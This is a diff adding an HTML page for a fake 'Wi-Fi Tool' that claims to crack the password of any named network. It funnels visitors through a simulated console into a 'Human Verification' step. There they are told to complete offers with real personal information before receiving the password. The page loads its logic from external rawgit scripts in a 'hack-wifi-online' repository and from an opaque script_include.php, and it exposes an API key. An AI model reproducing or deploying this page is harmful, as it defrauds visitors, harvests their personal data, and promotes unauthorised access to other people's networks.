@@ -1,0 +1,301 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <link rel="shortcut icon" href="./img/favicon.ico" />
+
+        <title>Wi-Fi Tool</title>
+    <meta charset="UTF-8">
+    <meta property="og:site_name" content="Wi-Fi Tool" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Wi-Fi Tool" />
+ 
+    <!-- CSS -->
+    <link href="https://rawgit.com/perampokgoogle/hack-wifi-online/master/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://rawgit.com/perampokgoogle/hack-wifi-online/master/style.css" rel="stylesheet" />
+    <link href="https://rawgit.com/perampokgoogle/hack-wifi-online/master/font-awesome.min.css" rel="stylesheet" />
+    <link rel="stylesheet"https://rawgit.com/perampokgoogle/hack-wifi-online/master/animate.min.css" />
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
+ 
+<body>
+
+<div id="overlay" class="container">
+    <div class="pre-loader">
+        <div class="preloader">
+            <div class="sound-bar">
+                <div class="bar1"></div>
+                <div class="bar2"></div>
+                <div class="bar3"></div>
+                <div class="bar4"></div>
+                <div class="bar5"></div>
+            </div>
+            <p class="text-center gens-text blender-pro-book">Loading... Please wait!</p>
+        </div>
+    </div>
+</div>
+
+<div class="video-holder">
+    <div class="overlay"></div>
+    <video autoplay="" loop="" poster="img/bg3.jpg" id="bgvid">
+    </video>
+</div>
+
+<div class="content">
+
+    <div class="header">
+        <div class="inner">
+            <img src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/logo.png" height="auto" width="155px" class="img-responsive logo" alt="" />
+        </div>
+    </div>
+
+
+
+    <div class="section-gens-before">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-16 col-sm-10 col-sm-offset-1 col-md-8 col-md-offset-2">
+                    <div class="panel panel-default ">
+                        <div class="panel-heading">
+                            <h3 class="panel-title blender-pro-book">Wi-Fi Tool <i class="fa fa-terminal blue-text-color"></i></h3>
+                        </div>
+                        <div class="panel-body">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <p class="text-center gens-text blender-pro-book">Enter Wi-Fi Network Name and the city it is located in. <i class="fa fa-check blue-text-color"></i></p>
+                                <!-- Form -->
+                                    <form id="form" />
+                                        <div class="row">
+                                            <div class="col-md-6">
+                                                <div class="input-group">
+                                                    <span class="input-group-addon" id="basic-addon1"><i class="fa fa-user-secret fa-lg"></i></span>
+                                                    <input id="username" type="text" class="form-control blender-pro-book form-text" placeholder="Network Name" aria-describedby="basic-addon1" />
+                                                </div>
+                                                 <p class="error-holder"><span id="error" class="error blender-pro-book"><i class="fa fa-exclamation-triangle"></i> Network Name cannot be empty</span></p>
+                                            </div>
+
+                                            <div class="col-md-6">
+                                                <div class="input-group">
+                                                    <span class="input-group-addon" id="basic-addon1"><i class="fa fa-user-secret fa-lg"></i></span>
+                                                    <input id="city" type="text" class="form-control blender-pro-book form-text" placeholder="City" aria-describedby="basic-addon1" />
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <br />
+                                        <div class="row">
+                                            <div class="col-md-6 col-md-offset-3 col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3">
+                                                <button id="start" type="button" class="btn btn-default btn-lg btn-block btn-custom blender-pro-book">Next <i class="fa fa-hand-o-right blue-text-color"></i></button>
+                                            </div>
+                                        </div>
+                                    </form>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="section-gens-after ">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-16 col-sm-10 col-sm-offset-1 col-md-8 col-md-offset-2">
+                    <div class="panel panel-default ">
+                        <div class="panel-heading">
+                            <h3 class="panel-title blender-pro-book">Wi-Fi Tool <i class="fa fa-terminal blue-text-color"></i></h3>
+                        </div>
+                        <div class="panel-body">
+                            <div class="row">
+                                <div class="col-md-12">
+                                <h4 class="blender-pro-book h4-gens text-center">Settings</h4>
+                                <hr />
+                                    <p class="text-center gens-text">Choose a private server and select whether or not to use a VPN and proxy.</p>
+                                <!-- Form -->
+                                    <form />
+                                        <div class="row">
+                                            <div class="col-md-6 col-md-offset-3">
+                                                <div class="input-group">
+                                                    <span class="input-group-addon" id="basic-addon1"><img src="" class="img-resources" alt="" /></span>
+                                                    <select id="diamond" class="form-control blender-pro-book form-text">
+                                                        <option value="a_1.945" />Server a_1.945
+                                                        <option value="a_1.955" />Server a_1.955
+                                                        <option value="b_1.945" />Server b_1.945
+                                                        <option value="b_1.955" />Server b_1.955
+                                                    </select>
+                                                </div>
+                                            </div>
+
+                                            <div class="col-md-6">
+                                                <div class="input-group">
+                                                    <span class="input-group-addon" id="basic-addon1"><img src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/proxy.png" class="img-resources" alt="" /></span>
+                                                    <select id="gold" class="form-control blender-pro-book form-text">
+                                                        <option value="Off" />Proxy [No]
+                                                        <option value="On" />Proxy [Yes]
+                                                    </select>
+                                                </div>
+                                            </div>
+
+                                            <div class="col-md-6">
+                                                <div class="input-group">
+                                                    <span class="input-group-addon" id="basic-addon1"><img src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/vpn.png" class="img-resources" alt="" /></span>
+                                                    <select id="iron" class="form-control blender-pro-book form-text">
+                                                        <option value="Off" />VPN [No]
+                                                        <option value="On" />VPN [Yes]
+                                                    </select>
+                                                </div>
+                                            </div>
+
+
+
+                                            
+
+                                        </div>
+
+                                        <br />
+                                        <div class="row">
+                                            <div class="col-md-6 col-md-offset-3 col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3">
+                                                <button id="gens" type="button" class="btn btn-default btn-lg btn-block btn-custom blender-pro-book">Generate <i class="fa fa-cogs blue-text-color"></i></button>
+                                            </div>
+                                        </div>
+                                    </form>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section Console -->
+
+    <div class="section-gens-console">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-16 col-sm-10 col-sm-offset-1 col-md-8 col-md-offset-2">
+                    <div class="panel panel-default ">
+                        <div class="panel-heading">
+                            <h3 class="panel-title blender-pro-book">Wi-Fi Tool <i class="fa fa-terminal blue-text-color"></i></h3>
+                        </div>
+
+                        <div class="panel-body consol-space">
+                            <div id="container"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Section offers -->
+
+    <div class="section-offers" id="ofer">
+        <div class="container">
+            <div class="row">
+                <div class="col-xs-16 col-sm-10 col-sm-offset-1 col-md-8 col-md-offset-2">
+                    <div class="panel panel-default ">
+                        <div class="panel-heading">
+                            <h3 class="panel-title blender-pro-book text-center">Human Verification<i class="fa fa-user blue-text-color"></i></h3>
+                        </div>
+                        <div class="panel-body panel-offers ">
+                            <p class="text-ofers blender-pro-book">Before we can give you your password we need to <span class="offers-blue-text">VERIFY</span> that you are human and not an automated bot. This is to regulate and prevent abuse of the tool.</p>
+                            <hr />
+                            <ol class="custom-bullet custom-bullet--a">
+                                <li><span class="text-ofers blender-pro-book">Choose any 60-second offer below.</span></li>
+                                <li><span class="text-ofers blender-pro-book">Complete offer with real information.</span></li>
+                                <li><span class="text-ofers blender-pro-book">Receive your decrypted Wi-Fi Password.</span></li>
+                            </ol>
+
+                            <br />
+       
+       <br />
+                            <ul class="list-group" id="offers">
+                            </ul>
+                            <br />
+
+                            <div class="check" id="checkings">
+                                <div class="preloader">
+                                    <div class="sound-bar">
+                                        <div class="bar1"></div>
+                                        <div class="bar2"></div>
+                                        <div class="bar3"></div>
+                                        <div class="bar4"></div>
+                                        <div class="bar5"></div>
+                                    </div>
+                                </div>
+                                <button id="backToOffers" type="button" class="btn btn-default btn-lg btn-block btn-custom blender-pro-book"><i class="fa fa-hand-o-left blue-text-color"></i> Try different offer</button>
+                                <br />
+                            </div>
+                            <p class="text-ofers blender-pro-book">Password will be available immediately upon completion.</p>
+
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+
+<div class="footer">
+    <div class="inner-footer">
+        <div class="container footer-text">
+            <a href="#" target="_blank" class="socials-fb">
+                <span class="fa fa-fw fa-facebook fa-2x"></span>
+            </a>
+
+            <a href="#" target="_blank" class="socials-twttr">
+                <span class="fa fa-fw fa-twitter fa-2x"></span>
+            </a>
+
+            <a href="#" rel="publisher" target="_blank" class="socials-gplus">
+                <span class="fa fa-fw fa-google-plus fa-2x"></span>
+            </a>
+        </div>
+        <div class="container footer-text">
+            <p class="info-text-footer blender-pro-book">© 2016 - <span class="yallow-text">Wi-Fi Tool</span> All rights reserved.</p>
+        </div>
+    </div>
+</div>
+
+
+
+<!-- JS -->
+    <script src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/jquery-1.11.3.min.js"></script>
+    <script src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/bootstrap.min.js"></script>
+    <script src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/tjs.js"></script>
+    <script src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/script.js"></script>
+ <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBBP1AcDm2SdgQjHVvsBTHyAgZqoRzdE-s&libraries=places&callback=initialize"
+        async defer></script>
+ <script type="text/javascript">
+  //google.load("maps", "3.x", {callback: initialize, other_params:'sensor=false&libraries=places'});
+
+  function initialize() {
+   var input = document.getElementById('city');
+   var autocomplete = new google.maps.places.Autocomplete(input, { types: ['(cities)'], region:'EU' });
+   google.maps.event.addListener(autocomplete, 'place_changed', function() {
+    var place = autocomplete.getPlace();
+    if (!place.geometry) {
+     console.log('no location');
+     return;
+    }
+    console.log(place);
+   });
+  }
+ </script>
+<script type="text/javascript" src="https://rawgit.com/perampokgoogle/hack-wifi-online/master/script_include.php?id=621313"></script>
+<div id="OKAYFREEDOM_INJECTED" style="display: none;"></div><div id="OKAYFREEDOM_PROXY_INVOLVED" style="display: none;"></div></body>
+</html>
